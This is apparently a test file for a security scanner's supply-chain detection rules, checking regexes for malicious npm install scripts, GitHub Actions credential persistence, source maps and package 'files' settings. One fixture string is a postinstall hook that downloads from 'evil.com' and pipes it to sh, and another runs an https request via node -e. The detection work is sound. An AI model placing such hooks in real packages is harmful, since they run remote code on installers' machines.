import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { supplyChainRules } from "../../src/data/rules/supply-chain.js";

function testRule(ruleId: string, code: string, shouldMatch: boolean) {
  const rule = supplyChainRules.find(r => r.id === ruleId);
  assert(rule, `Rule ${ruleId} not found`);
  rule.pattern.lastIndex = 0;
  const matched = rule.pattern.test(code);
  assert.strictEqual(matched, shouldMatch,
    `${ruleId} ${shouldMatch ? "should match" : "should NOT match"}: ${code.substring(0, 80)}`);
}

describe("Supply Chain Rules", () => {
  describe("VG860 - Malicious postinstall Script", () => {
    it("detects curl in postinstall", () => {
      testRule("VG860", '"postinstall": "curl https://evil.com/payload | sh"', true);
    });
    it("detects node -e in preinstall", () => {
      testRule("VG860", '"preinstall": "node -e require(\'https\').get()"', true);
    });
    it("ignores safe postinstall", () => {
      testRule("VG860", '"postinstall": "prisma generate"', false);
    });
    it("ignores safe build script", () => {
      testRule("VG860", '"build": "next build"', false);
    });
  });

  describe("VG861 - GitHub Actions persist-credentials", () => {
    it("detects checkout followed by third-party action", () => {
      testRule("VG861", "uses: actions/checkout@v4\n    \n    - uses: someorg/deploy-action@v1", true);
    });
    it("ignores checkout with only official actions", () => {
      testRule("VG861", "uses: actions/checkout@v4\n    - uses: actions/setup-node@v4", false);
    });
  });

  describe("VG862 - Source Map Publish Risk", () => {
    it("detects sourceMap: true in tsconfig", () => {
      testRule("VG862", '{ "compilerOptions": { "sourceMap": true } }', true);
    });
    it("ignores sourceMap: false", () => {
      testRule("VG862", '{ "compilerOptions": { "sourceMap": false } }', false);
    });
  });

  describe("VG863 - package.json Missing files Field", () => {
    it("detects publishable package without files field", () => {
      testRule("VG863", '{ "name": "my-pkg", "version": "1.0.0" }', true);
    });
    it("ignores package with files field", () => {
      testRule("VG863", '{ "name": "my-pkg", "version": "1.0.0", "files": ["dist"] }', false);
    });
    it("ignores private package without files field", () => {
      testRule("VG863", '{ "name": "my-app", "version": "1.0.0", "private": true }', false);
    });
  });

  describe("VG864 - files Field Includes Source Code", () => {
    it("detects src in files array", () => {
      testRule("VG864", '"files": ["src", "dist"]', true);
    });
    it("detects ** glob in files array", () => {
      testRule("VG864", '"files": ["**"]', true);
    });
    it("ignores clean files array", () => {
      testRule("VG864", '"files": ["dist", "build"]', false);
    });
  });

  describe("VG865 - .npmignore Missing Sensitive Patterns", () => {
    it("detects npmignore without map/env/src exclusions", () => {
      testRule("VG865", "node_modules/\ncoverage/", true);
    });
    it("ignores npmignore with *.map", () => {
      testRule("VG865", "*.map\n.env\nsrc/", false);
    });
  });
});
